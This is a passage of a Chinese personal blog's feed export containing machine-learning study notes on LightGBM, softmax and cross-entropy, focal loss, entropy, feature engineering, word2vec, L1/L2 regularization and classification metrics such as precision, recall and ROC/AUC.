LightGBM 使用了直方图算法将特征值转变为 bin 值，且不需要记录特征到样本的索引，将空间复杂度从 $O(2\times data)$降低为 $O(bin)$ ，极大的减少了内存消耗；</li><li>LightGBM 采用了直方图算法将存储特征值转变为存储 bin 值，降低了内存消耗；</li><li>LightGBM 在训练过程中采用互斥特征捆绑算法减少了特征数量，降低了内存消耗。</li></ol><p><strong>速度更快</strong></p><ol><li>LightGBM 采用了直方图算法将遍历样本转变为遍历直方图，极大的降低了时间复杂度；</li><li>LightGBM 在训练过程中采用单边梯度算法过滤掉梯度小的样本，减少了大量的计算；</li><li>LightGBM 采用了基于 Leaf-wise 算法的增长策略构建树，减少了很多不必要的计算量；</li><li>LightGBM 采用优化后的特征并行、数据并行方法加速计算，当数据量非常大的时候还可以采用投票并行的策略；</li><li>LightGBM 对缓存也进行了优化，增加了 Cache hit 的命中率。</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="　参考"></a>　参考</h2><p><a href="https://zhuanlan.zhihu.com/p/87885678" target="_blank" rel="noopener">【机器学习】决策树（下）——XGBoost、LightGBM（非常详细）</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;树类模型的发展与总结&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="AI" scheme="http://www.dyngq.top/categories/AI/"/>
    
    
      <category term="ML" scheme="http://www.dyngq.top/tags/ML/"/>
    
  </entry>
  
  <entry>
    <title>从sigmoid，softmax，到交叉熵，到focal-loss</title>
    <link href="http://www.dyngq.top/2020/09/21/20200921-%E4%BB%8Esigmoid%EF%BC%8Csoftmax%EF%BC%8C%E5%88%B0%E4%BA%A4%E5%8F%89%E7%86%B5%EF%BC%8C%E5%88%B0focal-loss/"/>
    <id>http://www.dyngq.top/2020/09/21/20200921-从sigmoid，softmax，到交叉熵，到focal-loss/</id>
    <published>2020-09-21T12:21:01.000Z</published>
    <updated>2022-06-20T11:44:21.558Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>sigmoid，softmax；</p><p>交叉熵损失，样本不均衡的focalloss损失；</p></blockquote><a id="more"></a><h2 id="0x01-sigmoid"><a href="#0x01-sigmoid" class="headerlink" title="0x01 sigmoid"></a>0x01 sigmoid</h2><p><img src="https://img.dyngq.top/images/20210317205433.png" alt="image-20210317205423645" style="zoom:50%;"></p><p><strong>求导</strong></p><p><img src="https://img.dyngq.top/images/20210317205447.png" alt="image-20210317205446308" style="zoom: 67%;"></p><h2 id="0x02-softmax"><a href="#0x02-softmax" class="headerlink" title="0x02 softmax"></a>0x02 softmax</h2><p><img src="https://img.dyngq.top/images/20210317205509.png" alt="image-20210317205508221" style="zoom:67%;"></p><p><img src="https://img.dyngq.top/images/20210317205528.png" alt="image-20210317205527163" style="zoom:67%;"></p><p>求导，并且简单推导下只有一层hidden layer加softmax的多分类神经网络</p><p>x为输入，z为中间隐层神经元，a为最终输出结果</p><p><img src="https://img.dyngq.top/images/20210321175518.png" alt="image-20210321175444430"></p><p>损失函数</p><p><img src="https://img.dyngq.top/images/20210321180106.png" alt="image-20210321180104828" style="zoom:80%;"></p><p>对某个参数进行求导</p><p><img src="https://img.dyngq.top/images/20210321175517.png" alt="image-20210321175515040" style="zoom: 80%;"></p><p>对于划线部分，分为两种情况</p><p><img src="https://img.dyngq.top/images/20210321180249.png" alt="image-20210321180247838"></p><p>softmax实质是将，最后一层的、数量与预测种类相同的神经元的<strong>输出</strong>，转化为<strong>概率</strong>。</p><p><img src="https://img.dyngq.top/images/20210321164713.png" alt="image-20210321164711451" style="zoom:67%;"></p><h2 id="0x03-Cross-Entropy与logsoftmax"><a href="#0x03-Cross-Entropy与logsoftmax" class="headerlink" title="0x03  Cross-Entropy与logsoftmax"></a>0x03  Cross-Entropy与logsoftmax</h2><p>先说<code>LogSoftmax</code>，</p><p><img src="https://img.dyngq.top/images/20210317182905.png" alt="image-20210317182903831"></p><p>logsoftmax省了一个指数计算，省了一个除法，数值上相对稳定一些。</p><p>其实 <code>Softmax_Cross_Entropy</code>里面也是这么实现的。这也就引出了<strong>交叉熵</strong>与<strong>softmax</strong>的关系。</p><p><strong>cross-entropy</strong> 不是机器学习独有的概念，本质上是用来衡量<strong>两个概率分布的相似性</strong>的。</p><p><strong>cross-entropy</strong> 公式为：</p><p><img src="https://img.dyngq.top/images/20210317205550.png" alt="image-20210317205549767" style="zoom:80%;"></p><p>其中预测概率<strong>q(k)</strong>就对应着<strong>softmax</strong>所输出的值，前边是log，所以，一般都直接采用<strong>logsoftmax</strong>节省计算。</p><p>P.S. 相对熵 KL散度</p><p><img src="https://img.dyngq.top/images/20210317205747.png" alt="image-20210317205746072" style="zoom:50%;"></p><h2 id="0x04-Focal-Loss"><a href="#0x04-Focal-Loss" class="headerlink" title="0x04 Focal-Loss"></a>0x04 Focal-Loss</h2><blockquote><p>何恺明 Kaiming 团队</p></blockquote><p>交叉熵</p><p><img src="http://img.dyngq.top/images/20210319224146.png" alt="image-20210319224143004" style="zoom: 67%;"></p><p><img src="http://img.dyngq.top/images/20210319224209.png" alt="image-20210319224208761" style="zoom:67%;"></p><p><img src="http://img.dyngq.top/images/20210319224236.png" alt="image-20210319224234969" style="zoom:67%;"></p><p><img src="http://img.dyngq.top/images/20210319224249.png" alt="image-20210319224248148" style="zoom:67%;"></p><p><img src="http://img.dyngq.top/images/20210319224302.png" alt="image-20210319224301439"></p><h2 id="Appendix"><a href="#Appendix" class="headerlink" title="Appendix"></a>Appendix</h2><p>师弟手绘 FUJUFILM</p><p><img src="https://img.dyngq.top/images/20210319212805.png" alt="image-20210319212804699"></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;sigmoid，softmax；&lt;/p&gt;
&lt;p&gt;交叉熵损失，样本不均衡的focalloss损失；&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="AI" scheme="http://www.dyngq.top/categories/AI/"/>
    
    
      <category term="ML" scheme="http://www.dyngq.top/tags/ML/"/>
    
  </entry>
  
  <entry>
    <title>概率与统计 （分布、熵）</title>
    <link href="http://www.dyngq.top/2020/09/09/20200909-%E6%A6%82%E7%8E%87%E7%BB%9F%E8%AE%A1/"/>
    <id>http://www.dyngq.top/2020/09/09/20200909-概率统计/</id>
    <published>2020-09-09T01:01:34.000Z</published>
    <updated>2022-06-20T11:44:21.558Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概率 统计 相关基本知识；</p><p>会学习写边补充。</p></blockquote><a id="more"></a><h2 id="0x01-分布"><a href="#0x01-分布" class="headerlink" title="0x01 分布"></a>0x01 分布</h2><h3 id="Logistic-分布"><a href="#Logistic-分布" class="headerlink" title="Logistic 分布"></a>Logistic 分布</h3><p><img src="https://img.dyngq.top/images/20210317202422.png" alt="image-20210317202356514">`</p><h2 id="0x02-假设检验"><a href="#0x02-假设检验" class="headerlink" title="0x02 假设检验"></a>0x02 假设检验</h2><h2 id="0x03-相关概念"><a href="#0x03-相关概念" class="headerlink" title="0x03 相关概念"></a>0x03 相关概念</h2><h3 id="3-1-偏差（Bias）与方差（Variance）"><a href="#3-1-偏差（Bias）与方差（Variance）" class="headerlink" title="3-1 偏差（Bias）与方差（Variance）"></a>3-1 偏差（Bias）与方差（Variance）</h3><ul><li>对于模型的集成学习来说<ul><li><strong>偏差</strong>是指由有所采样得到的大小为m的训练数据集，训练出的所有模型的输出的平均值真实模型输出之间的偏差；</li><li><strong>方差</strong>是指有所有采样得到的大小为m的训练数据集，训练出的所有模型的输出的方差；</li></ul></li></ul><h3 id="3-2-熵-相关"><a href="#3-2-熵-相关" class="headerlink" title="3-2 熵 相关"></a>3-2 熵 相关</h3><h4 id="3-2-1-相对熵（KL散度）"><a href="#3-2-1-相对熵（KL散度）" class="headerlink" title="3-2-1 相对熵（KL散度）"></a>3-2-1 相对熵（KL散度）</h4><p><img src="https://img.dyngq.top/images/20210314215322.png" alt="image-20210314215320964"></p><h4 id="3-2-2-交叉熵-Cross-entropy"><a href="#3-2-2-交叉熵-Cross-entropy" class="headerlink" title="3-2-2 交叉熵 Cross entropy"></a>3-2-2 交叉熵 Cross entropy</h4><p><img src="https://img.dyngq.top/images/20210314215501.png" alt="image-20210314215500210"></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;概率 统计 相关基本知识；&lt;/p&gt;
&lt;p&gt;会学习写边补充。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="AI" scheme="http://www.dyngq.top/categories/AI/"/>
    
    
      <category term="AI" scheme="http://www.dyngq.top/tags/AI/"/>
    
  </entry>
  
  <entry>
    <title>特征工程 &amp; word2vector &amp; L1 L2 正则 &amp; (Batch) Normalization</title>
    <link href="http://www.dyngq.top/2020/08/18/20200818-%E7%89%B9%E5%BE%81%E5%B7%A5%E7%A8%8B/"/>
    <id>http://www.dyngq.top/2020/08/18/20200818-特征工程/</id>
    <published>2020-08-18T00:40:00.000Z</published>
    <updated>2022-06-20T11:44:21.557Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>数据和特征，往往决定了结果的上限；</p><p>而算法和优化通常是为了接近这个上限。</p></blockquote><a id="more"></a><h2 id="0x01-归一化-Normalization"><a href="#0x01-归一化-Normalization" class="headerlink" title="0x01 归一化 Normalization"></a>0x01 归一化 Normalization</h2><blockquote><p>无量纲 ： 无物理单位 (比如比值等)</p><p>适合： 线性回归，逻辑回归LR，SVM, BP神经网络</p><p>不适合：决策树类（信息增益比 与是否归一化无关） </p></blockquote><h3 id="1-1-归一化"><a href="#1-1-归一化" class="headerlink" title="1-1 归一化"></a>1-1 归一化</h3><ol><li><p>等比缩放 ${x^{’} =\frac{x-min(x)}{x_{max}-x_{min}},x\in[0,1]}$</p></li><li><p>均值归一化 mean normalization $x^{’} =\frac{x-mean(x)}{x_{max}-x_{min}}, x\in[-1,1]$ </p></li><li><p>缩放到单位长度 scaling to unit length $x^{’} =\frac{x}{||x||}$ , $||x||$是欧几里得长度</p><ul><li>L2范数（平滑，非稀疏）：$\left | x \right |_{2}  = \sqrt{\sum_{i=1}^{n}\left | x_{i} \right |^2} = \sqrt{x_{1}^2+x_{2}^2+…+x_{n}^2}$<ul><li>欧几里得距离</li></ul></li><li><a href="#no.4"><strong>本文第四部分 （L1范数，L2范数） 将详细介绍</strong></a></li></ul></li><li><p>零均值归一化（<strong>标准化</strong>）</p><ul><li><p>映射到均值为0，标准差为1的分布上。 均值μ，标准差σ：</p></li><li><script type="math/tex; mode=display">z = \frac{x-\mu}{\sigma}</script></li><li><p><strong>标准差</strong>的存在也是为了消除量纲影响，<strong>方差</strong>的量纲与数据的量纲不一致。具体概率分布等详细知识可以参考我之后的文章 <a href>概率统计</a>中的相应部分。</p></li><li><p><img src="https://img.dyngq.top/images/20210210171051.png" alt="image-20210210171044043" style="zoom: 67%;"></p></li></ul></li></ol><ul><li>为什么要归一化<ul><li>同样学习率的情况下，在各特征维度上的梯度更新更加一致，能够更快的收敛。使不同量纲的特征处于同一数值量级，减少方差大的特征的影响，使模型更准确。</li><li>比如LR, BP神经网络等</li></ul></li><li>其他数据缩放方式：<a href="https://www.cnblogs.com/nxf-rabbit75/p/11141944.html" target="_blank" rel="noopener">cnblogs: 数据预处理方法</a></li></ul><h3 id="1-2-标准化"><a href="#1-2-标准化" class="headerlink" title="1-2 标准化"></a>1-2 标准化</h3><blockquote><p>归一化是标准化的方法之一</p></blockquote><p>一般将零均值归一化称为标准化。</p><h3 id="1-3-Batch-Normalization"><a href="#1-3-Batch-Normalization" class="headerlink" title="1-3 Batch Normalization"></a>1-3 Batch Normalization</h3><ul><li>《Batch Normalization: Accelerating Deep Network Training by Reducing Internal Covariate Shift》</li><li>BN work的根本原因，是因为在网络的训练阶段，其能够让<strong>优化空间</strong>（optimization landscape）变的<strong>平滑</strong>。</li><li>Batch Normalization位于<strong>激活函数之前</strong>，这样就可以使数据的分布更加适合非线性激活，避免落入激活函数不敏感区域，即梯度消失的问题。</li></ul><ul><li><strong>BN可以防止梯度爆炸或弥散、可以提高训练时模型对于不同超参（学习率、初始化）的鲁棒性、可以让大部分的激活函数能够远离其饱和区域</strong>。</li><li><img src="https://img.dyngq.top/images/20210210211742.png" alt="image-20210210211738825"><a href="https://link.zhihu.com/?target=https%3A//arxiv.org/abs/1805.11604" target="_blank" rel="noopener">论文</a></li><li>对于没有BN的神经网络，其loss函数是不仅非凸，并且还有很多flat regions、sharp minimal。这就使得那些基于梯度的优化方法变得不稳定，因为很容易出现过大或者过小的梯度值。观察上图，可以发现，在使用了BN后，loss的变化变得更加稳定，不会出现过大的跳动；同样，梯度也变得更加平滑。</li></ul><h2 id="0x02-编码与处理"><a href="#0x02-编码与处理" class="headerlink" title="0x02 编码与处理"></a>0x02 编码与处理</h2><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><ul><li>按一定顺序<strong>序号编码</strong>，一定程度可以保留大小信息。</li><li><strong>One-Hot 独热编码</strong>，很熟悉了，但有问题要注意<ul><li>需要整理节省存储空间，利用稀疏性，使用稀疏向量节省空间。</li><li>需要<strong>降维</strong><ul><li>KNN等高维空间下距离不好测算</li><li>LR等回过拟合</li><li>不是所有维度都是有效的，只有部分维度也就是部分特征是有效的。</li></ul></li></ul></li><li><strong>编码</strong>，节省空间</li><li>hash trick等</li></ul><h3 id="组合特征与降维"><a href="#组合特征与降维" class="headerlink" title="组合特征与降维"></a>组合特征与降维</h3><ul><li>矩阵分解<ul><li>(m, n) = (m, k) x (k, n)</li><li>形象上类似于encoder-decoder word2vector</li></ul></li><li>LDA</li><li>T-SNE<ul><li><strong>相对熵  KL散度</strong></li><li><img src="https://img.dyngq.top/images/20210210194143.png" alt="image-20210210194141941" style="zoom:80%;"></li></ul></li><li>详见之后文章 <a href>降维算法</a></li></ul><h3 id="文本特征"><a href="#文本特征" class="headerlink" title="文本特征"></a>文本特征</h3><h2 id="0x03-Word2Vector-【-】"><a href="#0x03-Word2Vector-【-】" class="headerlink" title="0x03 Word2Vector 【!】"></a>0x03 Word2Vector 【!】</h2><h3 id="3-1-CBOW与Skip-gram"><a href="#3-1-CBOW与Skip-gram" class="headerlink" title="3-1 CBOW与Skip-gram"></a>3-1 CBOW与Skip-gram</h3><p><img src="https://img.dyngq.top/images/20210210195245.png" alt="image-20210210194858880"></p><p>看图Word2Vector的原理就已经很好理解了，</p><p>需要注意的是，Word2Vector采用<strong>权重共享</strong>的方式，</p><p>其中<strong>CBOW</strong>方式的输入层参数权重共享很好理解，<strong>求和</strong>而已；</p><p>而<strong>Skip-gram</strong>采用的则是<strong>TOP-K</strong>的方式，输出最高的top-k个预测结果来表示上下文；</p><p>因为Word2Vector的上下文是<strong>词袋类型</strong>，是无序的。</p><h3 id="3-2-优化softmax"><a href="#3-2-优化softmax" class="headerlink" title="3-2 优化softmax"></a>3-2 优化softmax</h3><p>需要注意的是，以下两种方法，优化的是softmax这个输出过程，而不是softmax本身，这两种方法都与softmax无关。</p><h4 id="3-2-1-层次softmax"><a href="#3-2-1-层次softmax" class="headerlink" title="3-2-1. 层次softmax"></a>3-2-1. 层次softmax</h4><p>使用了树形结构，非叶节点相当于一个神经元（sigmoid），起分类作用；</p><p>每个叶子节点代表语料库中的一个词语，于是每个词语都可以被01唯一地编码，并且其编码序列对应一个事件序列；</p><p>而树则选择了<strong>哈夫曼树</strong>，因为Huffman编码中<strong>词频越高</strong>的词语对应的<strong>编码越短</strong>，特别<strong>适合word2vec的训练</strong>。</p><p>哈夫曼树很简单。每次从许多节点中，选择权值最小的两个合并，根节点为合并值；依次循环，直到只剩一棵树。</p><p><strong>label</strong>会编程哈夫曼编码，</p><p><strong>训练</strong>阶段不需要所有叶节点都输出，所以训练阶段平均只需要<strong>logN</strong>个节点即可，</p><p>预测阶段则需要所有节点。</p><p><strong>sigmoid</strong>:</p><script type="math/tex; mode=display">S(x) = \frac{1}{1+e^{-x_{}}}</script><p><strong>softmax</strong> 又称归一化指数函数:</p><script type="math/tex; mode=display">S(x) = \sum_{i=1}^{n}\frac{e^x}{e^{x_{i}}}</script><p>Sigmoid 输出结果是<strong>伯努利分布</strong><img src="https://img.dyngq.top/images/20210210220557.png" alt="image-20210210211448210" style="zoom:80%;"></p><p>而Softmax输出的是<strong>多项分布</strong> <img src="https://img.dyngq.top/images/20210210220601.png" alt="image-20210210211505585" style="zoom: 80%;"></p><p>同样都是<strong>二分类</strong>的情况下，两者时<strong>等价</strong>的，</p><p>有人说sigmoid会输出两个值，但是这两个值只是两次结果而已，不具有可加性，而且，应该是网络的设计问题，sigmoid的全连接只需要(n,1)即可，那就只有一个值了，而softmax需要(n, 2)，输出两个值。</p><p><img src="https://img.dyngq.top/images/20210210211027.png" alt="image-20210210211024273"></p><p><img src="https://img.dyngq.top/images/20210210203254.png" alt="image-20210210203237428" style="zoom: 50%;"></p><p>各叶子节点概率值相加为1:</p><p> <img src="https://img.dyngq.top/images/20210210203338.png" alt="image-20210210203334037" style="zoom:50%;"></p><p>P.S. 一般二分类模型做多分类的话都会采用树形结构，比如SVM多分类器就是树形结构，<img src="https://img.dyngq.top/images/20210210195758.png" alt="image-20210210195756499" style="zoom:25%;"></p><h4 id="3-2-2-负采样"><a href="#3-2-2-负采样" class="headerlink" title="3-2-2. 负采样"></a>3-2-2. 负采样</h4><blockquote><p>Negative Sampling简称NEG, 目的是用来提高训练速度和改善所得词向量的质量</p><p>NEG不使用复杂的哈夫曼树，而是使用<strong>随机负采样</strong>，大幅度提高性能</p><p>NCE 细节有点复杂，本质上是利用已知的概率密度函数来估计未知的概率密度函数。简单来说，如果已知概率密度X，未知Y，如果知道X和Y的关系，Y也就求出来了。</p><p>在训练的时候，需要给正例和负例。Hierarchical Softmax是把负例放在二叉树的根节点上，而NEG，是随机挑选一些负例。</p><p>负采样的本质：每次让一个训练样本只更新部分权重，其他权重全部固定；减少计算量；（一定程度上还可以增加随机性）</p></blockquote><p>样本少了，逻辑回归，似然函数，随机梯度上升</p><h2 id="0x04-L1范数，L2范数-【-】"><a href="#0x04-L1范数，L2范数-【-】" class="headerlink" title="0x04 L1范数，L2范数 【!】 "></a>0x04 L1范数，L2范数 【!】<span id="no.4"> </span></h2><p>范数 通用公式：</p><script type="math/tex; mode=display">\left \| x \right \|_{p}  = (\sum_{i=1}^{n}\left | x_{i} \right |^p)^{\frac{1}{p}}</script><p><strong>L0范数：</strong><img src="https://img.dyngq.top/images/20210210162519.png" alt="image-20210210162510433" style="zoom:67%;"></p><ul><li>表示向量中<strong>所有非零元素的个数</strong>，其非常适合机器学习中稀疏编码</li></ul><p><strong>L1范数（稀疏）：</strong></p><script type="math/tex; mode=display">\left \| x \right \|_{1}  = \sum_{i=1}^{n}\left | x_{i} \right |</script><ul><li>L1范数是指向量中<strong>各个元素绝对值之和</strong>，也有个美称叫“稀疏规则算子”（Lasso regularization）。L1范数和L0范数可以实现稀疏，L1因具有比L0更好的优化求解特性而被广泛应用。</li></ul><p><strong>L2范数（平滑，非稀疏）</strong></p><ul><li>欧几里得距离</li></ul><script type="math/tex; mode=display">\left \| x \right \|_{2}  = \sqrt{\sum_{i=1}^{n}\left | x_{i} \right |^2} = \sqrt{x_{1}^2+x_{2}^2+...+x_{n}^2}</script><p><img src="https://img.dyngq.top/images/20210210211056.png" alt="图4-1"> </p><p>​                                    图4-1</p><p><strong>L1 和 L2 范数在机器学习上最主要的应用大概分下面两类</strong></p><ul><li>作为<strong>损失函数</strong>使用</li><li>作为<strong>正则项</strong>使用也即所谓 <strong>L1-regularization</strong> 和 <strong>L2-regularization</strong></li></ul><h3 id="4-1-损失函数"><a href="#4-1-损失函数" class="headerlink" title="4-1 损失函数"></a>4-1 损失函数</h3><p><strong>L1</strong>:<img src="https://img.dyngq.top/images/20210210175758.png" alt="image-20210210174722927"> <strong>least absolute deviation (LAD，最小绝对偏差)</strong></p><blockquote><p>绝对值阻碍计算，但<strong>鲁棒性</strong> (Robust) 更强，对<strong>异常值</strong>更<strong>不敏感</strong>。</p></blockquote><p><strong>L2</strong>:  $ S = \sum_{i=1}^{n}（y_{i} - f(x_{i})）^2$ <strong>最小二乘误差 (least squares error, LSE)</strong></p><blockquote><p>求导、解方程等<strong>容易计算</strong>，比较常用</p></blockquote><p>另外，<strong>L2</strong> 一定<strong>只有一条</strong>最好的预测线，<strong>L1</strong> 则因为其性质<strong>可能存在多个最优解</strong>（图4-1即可解释）</p><p><a href="https://link.zhihu.com/?target=http%3A//www.bradthiessen.com/html5/docs/ols.pdf" target="_blank" rel="noopener">详细参考资料</a></p><h3 id="4-2-正则-L1-regularization-和-L2-regularization"><a href="#4-2-正则-L1-regularization-和-L2-regularization" class="headerlink" title="4-2 正则 L1-regularization 和 L2-regularization"></a>4-2 正则 <strong>L1-regularization</strong> 和 <strong>L2-regularization</strong></h3><p><img src="https://img.dyngq.top/images/20210210175753.png" alt="image-20210210175747529"></p><p>先说<strong>特点</strong>和<strong>优缺点</strong>：</p><ul><li>如上面提到的，<strong>L2 计算起来更方便</strong>，而 L1 在特别是非稀疏向量上的计算效率就很低；</li><li>L2 有唯一解，而 L1 不是；</li><li>L1 最重要的一个特点，<strong>输出稀疏</strong>，会把不重要的特征直接置零，而 L2 则不会；</li><li>L1 天然的输出稀疏性，把不重要的特征都置为 0，所以<strong>L1</strong>也是<strong>一个天然的特征选择器</strong>。</li></ul><h3 id="4-3-L1-稀疏性-（画图-和-导数-两钟方式进行解释）"><a href="#4-3-L1-稀疏性-（画图-和-导数-两钟方式进行解释）" class="headerlink" title="4-3 L1 稀疏性 （画图 和 导数 两钟方式进行解释）"></a>4-3 L1 稀疏性 （画图 和 导数 两钟方式进行解释）</h3><h4 id="4-3-1-导数"><a href="#4-3-1-导数" class="headerlink" title="4-3-1 导数"></a>4-3-1 导数</h4><p><img src="https://img.dyngq.top/images/20210210192511.png" alt="image-20210210192405307"></p><p>能看出来，w越接近0时，L1始终为正负1，而L2则越来越小，一直是一个趋势。这也是为什么L1输出容易稀疏，L2很难稀疏的原因。</p><p><img src="https://img.dyngq.top/images/20210210193900.png" alt="image-20210210192528634" style="zoom:50%;"></p><p>在梯度更新时，不管 L1 的大小是多少（只要不是0）梯度都是1或者-1，所以每次更新时，它都是稳步向0前进。</p><p><img src="https://img.dyngq.top/images/20210210193902.png" alt="image-20210210192612755" style="zoom: 80%;"></p><p>而看 L2 的话，就会发现它的梯度会越靠近0，就变得越小。</p><p><img src="https://img.dyngq.top/images/20210210193904.png" alt="image-20210210192628317" style="zoom:80%;"></p><p>也就是说加了 L1 正则的话基本上经过一定步数后很可能变为0，而 L2 几乎不可能，因为在值小的时候其梯度也会变小。于是也就造成了 L1 输出稀疏的特性。</p><h4 id="4-3-2-画图"><a href="#4-3-2-画图" class="headerlink" title="4-3-2 画图"></a>4-3-2 画图</h4><p>图像上也能类似于上边看出来，</p><p>L1一般相切与坐标轴，也就是有一维为0的点，也就是稀疏；</p><p>而L2两个坐标都很难为0，所以不稀疏，也就是平滑。</p><p><img src="https://img.dyngq.top/images/20210210182028.png" alt="image-20210210182026684"></p><h2 id="0x05-其他思考"><a href="#0x05-其他思考" class="headerlink" title="0x05 其他思考"></a>0x05 其他思考</h2><h3 id="5-1-图嵌入（Graph-embedding）"><a href="#5-1-图嵌入（Graph-embedding）" class="headerlink" title="5-1 图嵌入（Graph embedding）"></a>5-1 图嵌入（Graph embedding）</h3><p><a href="https://zhuanlan.zhihu.com/p/100586855" target="_blank" rel="noopener">知乎：图嵌入（Graph embedding）- 简介</a></p><p><a href="https://zhuanlan.zhihu.com/p/87572912" target="_blank" rel="noopener">知乎：为什么要进行图嵌入（Graph embedding）？</a></p><h3 id="5-2-LDA与word2vector"><a href="#5-2-LDA与word2vector" class="headerlink" title="5-2 LDA与word2vector"></a>5-2 LDA与word2vector</h3><blockquote><p>关键点在于似然函数不同</p></blockquote><p>LDA是概率图生成模型，似然函数是概率乘积；</p><p>w2v似然函数则是与神经网络输出有关，loss的反向传播，也就是深度学习常用的交叉熵。</p><h2 id="5-3-似然函数-交叉熵"><a href="#5-3-似然函数-交叉熵" class="headerlink" title="5-3 似然函数 交叉熵"></a>5-3 似然函数 交叉熵</h2><blockquote><p>异曲同工</p></blockquote><p>在之后的文章在讲吧，还有T-SNE的相对熵之类的</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol><li><a href="https://zhuanlan.zhihu.com/p/24810318" target="_blank" rel="noopener">什么是批标准化 (Batch Normalization)</a></li><li><a href="https://plmsmile.github.io/2017/11/02/word2vec-math/" target="_blank" rel="noopener">Word2vec之数学模型</a></li><li><a href="https://www.zhihu.com/question/26485586/answer/616029832" target="_blank" rel="noopener">l1正则与l2正则的特点是什么，各有什么优势？Andy Yang的回答</a></li><li><a href="https://blog.csdn.net/BGoodHabit/article/details/106163130" target="_blank" rel="noopener">层次softmax (hierarchical softmax）理解</a></li><li><a href="https://www.youtube.com/watch?v=pzyIWCelt_E" target="_blank" rel="noopener">Youtube: Q&amp;A - Hierarchical Softmax in word2vec - ChrisMcCormickAI</a></li><li><a href="https://www.cnblogs.com/pinard/p/7249903.html" target="_blank" rel="noopener">word2vec原理(三) 基于Negative Sampling的模型</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;数据和特征，往往决定了结果的上限；&lt;/p&gt;
&lt;p&gt;而算法和优化通常是为了接近这个上限。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="AI" scheme="http://www.dyngq.top/categories/AI/"/>
    
    
      <category term="AI" scheme="http://www.dyngq.top/tags/AI/"/>
    
  </entry>
  
  <entry>
    <title>模型评价</title>
    <link href="http://www.dyngq.top/2020/07/22/20200722-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BB%B7%E6%8C%87%E6%A0%87/"/>
    <id>http://www.dyngq.top/2020/07/22/20200722-模型评价指标/</id>
    <published>2020-07-22T12:10:44.000Z</published>
    <updated>2022-06-20T11:44:21.557Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>常用的模型评价指标以及他们的一些问题</p></blockquote><a id="more"></a><h2 id="0x01-常用指标"><a href="#0x01-常用指标" class="headerlink" title="0x01 常用指标"></a>0x01 常用指标</h2><p><strong>混淆矩阵</strong> Confusion Matrix</p><p><img src="https://img.dyngq.top/images/20210212010541.png" alt="image-20210212010539602"></p><p><strong>T</strong>和<strong>F</strong>表示预测结果是<strong>True</strong>还是<strong>False</strong>，<strong>P</strong>和<strong>N</strong>则表示正样本和负样本。</p><p><strong>TP</strong>表示正样本被预测正确的数目，<strong>TN</strong>表示负样本被预测正确的数目。</p><p><strong>FP</strong>表示正样本被预测为负样本的数目，<strong>FN</strong>表示负样本被预测为正样本的数目。</p><p>sklearn的混淆矩阵示例是一个三分类，所以考虑了多分类的混淆矩阵应该怎么表示。</p><p><img src="https://img.dyngq.top/images/20210225162537.jpg" alt="python实现混淆矩阵"></p><p>混淆矩阵M的每一行表示真实的类，每一列表示预测的类。</p><p>重点关注混淆矩阵的对角线区域，它表示实际类别和预测类别相一致，即<code>TP</code>区域。</p><ul><li><p><strong>准确率</strong>    </p><ul><li>公式 ：$ Accuracy = \frac{n_{correct}}{n_{total}} $</li><li>预测正确的占全部比例，最简单的指标</li></ul></li><li><p><strong>精确率</strong> </p><ul><li>公式 ：$Precision = \frac{TP}{TP+FP}$ </li><li>“你认为是对的里，有多少是对的”</li></ul></li><li><p><strong>召回率</strong> </p><ul><li>公式 ：$Recall = \frac{TP}{TP+FN}$</li><li>“所有对的里，你找到了多少”</li></ul></li><li><p><strong>精确率</strong>和<strong>召回率</strong>是一对欢喜冤家</p><ul><li>Precision值和Recall值是既矛盾又统一的两个指标，为了提高Precision值，分类器需要尽量在“更有把握”时才把样本预测为正样本，但此时往往会因为过于<strong>保守</strong>而漏掉很多“没有把握”的正样本，导致Recall值降低。<strong>反之</strong>亦然。</li><li>基于以上特点，就出现了<strong>F1-Score</strong>评价指标。</li></ul></li><li><p><strong>F1-Score</strong></p><ul><li><script type="math/tex; mode=display">F1 = \frac{2*precision*recall}{precision+recall}=\frac{2}{\frac{1}{precision}+\frac{1}{recall}}</script></li><li><p>从公式的后半部分可以看出，F1-Score的目的就是同时提高精确率和召回率。</p></li></ul></li><li><p><strong>P-R 曲线</strong> （<a href="#addimg">附图右图</a>）</p><ul><li>横坐标为召回率，纵坐标为精确率</li><li>根据不同阈值下获得的每一个结果作为每一个点，绘制曲线图。（存在先排序，切分坐标系，直接填结果的画图方式，不需要不同阈值反复统计）</li></ul></li><li><p><strong>FPR</strong> <strong>误报率</strong> 假阳性率（False Positive Rate，FPR）</p><ul><li><p>假的里有多少被判为真了</p></li><li><script type="math/tex; mode=display">FPR = \frac{FP}{N} = \frac{FP}{FP + TN}</script></li></ul></li><li><p><strong>TPR</strong> <strong>检出率</strong> 真阳性 率（True Positive Rate，TPR）</p><ul><li><p>真的里有多少检测出来了</p></li><li><script type="math/tex; mode=display">TPR = \frac{TP}{P} = \frac{TP}{TP + FN}</script></li></ul></li><li><p><strong>ROC 曲线 </strong>（<a href="#addimg">附图左图</a>）</p><ul><li>横坐标FPR，纵坐标TPR</li><li>同样根据不同阈值下的预测结果来确定FPR TPR，即一对坐标</li><li>Receiver Operating Characteristic Curve | 受试者工 作特征曲线 起源见<a href="#addword">附录</a></li></ul></li><li><p><strong>AUC</strong></p><ul><li>Aera Under Curve，曲线下的面积</li><li>AUC越大，说明分类器越可能把真正的正样本排在前面，分类性能越好。</li></ul></li><li><p><strong>ROC曲线 